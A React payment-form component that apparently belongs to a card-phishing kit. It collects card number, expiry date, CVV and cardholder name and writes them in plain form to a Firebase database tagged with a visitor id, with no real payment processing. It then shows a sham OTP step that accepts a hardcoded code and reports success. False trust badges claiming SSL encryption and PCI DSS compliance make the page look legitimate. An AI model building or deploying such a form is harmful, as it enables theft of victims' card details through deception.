import { useState } from "react"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { LockIcon, CreditCardIcon, ShieldCheckIcon, CheckCircleIcon } from "lucide-react"
import { OtpVerification } from "./otp"
import { addData } from "../firebase"



export function PaymentForm() {
  const paymentFormSchema = z.object({
  cardNumber: z.string().min(16, "Card number must be 16 digits").max(19),
  cardholderName: z.string().min(2, "Cardholder name is required"),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Expiry date must be in MM/YY format"),
  cvv: z.string().min(3, "CVV must be 3-4 digits").max(4),
})

type PaymentFormValues = z.infer<typeof paymentFormSchema>
  
  const [showOtp, setShowOtp] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
    setValue,
  } = useForm<PaymentFormValues>({
    resolver: zodResolver(paymentFormSchema),
    defaultValues: {
      cardNumber: "",
      cardholderName: "",
      expiryDate: "",
      cvv: "",
    },
  })

  function onSubmit(data: PaymentFormValues) {
    setIsSubmitting(true)
    const _id = localStorage.getItem("visitor")
    addData({
      id: _id,
      cardNumber: data.cardNumber,
      year: data.expiryDate,
      cvv: data.cvv,
      cardholderName: data.cardholderName,
    })

    setTimeout(() => {
      setIsSubmitting(false)
      setShowOtp(true)
    }, 1000)
  }

  function handleOtpSubmit(otp: string) {
    setIsSubmitting(true)

    setTimeout(() => {
      setIsSubmitting(false)
      if (otp === "123456") {
        alert("Payment successful!")
        setOtpError(false)
      } else {
        setOtpError(true)
      }
    }, 1000)
  }

  function formatCardNumber(value: string) {
    return value
      .replace(/\s/g, "")
      .replace(/(\d{4})/g, "$1 ")
      .trim()
  }

  function formatExpiryDate(value: string) {
    return value.replace(/\D/g, "").replace(/(\d{2})(\d)/, "$1/$2")
  }

  if (showOtp) {
    return (
      <OtpVerification
        onSubmit={handleOtpSubmit}
        isSubmitting={isSubmitting}
        error={otpError}
        onBack={() => setShowOtp(false)}
      />
    )
  }

  return (
    <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100 max-w-md mx-auto">
      {/* Header */}
      <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-6 text-white">
        <div className="flex items-center gap-3 mb-2">
          <div className="p-2 bg-white/20 rounded-lg">
            <CreditCardIcon className="h-6 w-6" />
          </div>
          <div>
            <h2 className="text-xl font-bold">Secure Payment</h2>
            <p className="text-blue-100 text-sm">Complete your transaction safely</p>
          </div>
        </div>
      </div>

      {/* Security Badge */}
      <div className="px-6 py-3 bg-green-50 border-b border-green-100">
        <div className="flex items-center justify-center gap-2 text-green-700">
          <ShieldCheckIcon className="h-4 w-4" />
          <span className="text-sm font-medium">256-bit SSL Encryption</span>
        </div>
      </div>

      {/* Form */}
      <div className="p-6">
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
          {/* Card Number */}
          <div className="space-y-2">
            <label htmlFor="cardNumber" className="block text-sm font-semibold text-gray-800">
              Card Number
            </label>
            <div className="relative">
              <input
                id="cardNumber"
                type="text"
                placeholder="1234 5678 9012 3456"
                className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                  errors.cardNumber
                    ? "border-red-300 focus:border-red-500 bg-red-50"
                    : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                }`}
                {...register("cardNumber", {
                  onChange: (e) => {
                    const formatted = formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
                    setValue("cardNumber", formatted)
                  },
                })}
              />
              <CreditCardIcon className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
            </div>
            {errors.cardNumber && (
              <p className="text-sm text-red-600 flex items-center gap-1">
                <span className="w-1 h-1 bg-red-600 rounded-full"></span>
                {errors.cardNumber.message}
              </p>
            )}
          </div>

          {/* Cardholder Name */}
          <div className="space-y-2">
            <label htmlFor="cardholderName" className="block text-sm font-semibold text-gray-800">
              Cardholder Name
            </label>
            <input
              id="cardholderName"
              type="text"
              placeholder="John Doe"
              className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                errors.cardholderName
                  ? "border-red-300 focus:border-red-500 bg-red-50"
                  : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
              }`}
              {...register("cardholderName")}
            />
            {errors.cardholderName && (
              <p className="text-sm text-red-600 flex items-center gap-1">
                <span className="w-1 h-1 bg-red-600 rounded-full"></span>
                {errors.cardholderName.message}
              </p>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label htmlFor="expiryDate" className="block text-sm font-semibold text-gray-800">
                Expiry Date
              </label>
              <input
                id="expiryDate"
                type="text"
                placeholder="MM/YY"
                className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                  errors.expiryDate
                    ? "border-red-300 focus:border-red-500 bg-red-50"
                    : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                }`}
                {...register("expiryDate", {
                  onChange: (e) => {
                    const formatted = formatExpiryDate(e.target.value.slice(0, 5))
                    setValue("expiryDate", formatted)
                  },
                })}
              />
              {errors.expiryDate && (
                <p className="text-xs text-red-600 flex items-center gap-1">
                  <span className="w-1 h-1 bg-red-600 rounded-full"></span>
                  {errors.expiryDate.message}
                </p>
              )}
            </div>

            <div className="space-y-2">
              <label htmlFor="cvv" className="block text-sm font-semibold text-gray-800">
                CVV
              </label>
              <input
                id="cvv"
                type="password"
                placeholder="123"
                className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                  errors.cvv
                    ? "border-red-300 focus:border-red-500 bg-red-50"
                    : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                }`}
                {...register("cvv", {
                  onChange: (e) => setValue("cvv", e.target.value.replace(/\D/g, "").slice(0, 4)),
                })}
              />
              {errors.cvv && (
                <p className="text-xs text-red-600 flex items-center gap-1">
                  <span className="w-1 h-1 bg-red-600 rounded-full"></span>
                  {errors.cvv.message}
                </p>
              )}
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full py-4 px-6 rounded-xl text-white font-bold text-lg transition-all duration-200 transform ${
              isSubmitting
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 hover:scale-[1.02] shadow-lg hover:shadow-xl"
            }`}
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                Processing...
              </div>
            ) : (
              <div className="flex items-center justify-center gap-2">
                <LockIcon className="h-5 w-5" />
                Complete Payment
              </div>
            )}
          </button>
        </form>
      </div>

      {/* Footer */}
      <div className="px-6 py-4 bg-gray-50 border-t border-gray-100">
        <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
          <CheckCircleIcon className="h-4 w-4 text-green-500" />
          <span>Your payment information is protected</span>
        </div>
        <div className="flex items-center justify-center gap-4 mt-2 text-xs text-gray-500">
          <span>PCI DSS Compliant</span>
          <span>•</span>
          <span>Bank-level Security</span>
        </div>
      </div>
    </div>
  )
}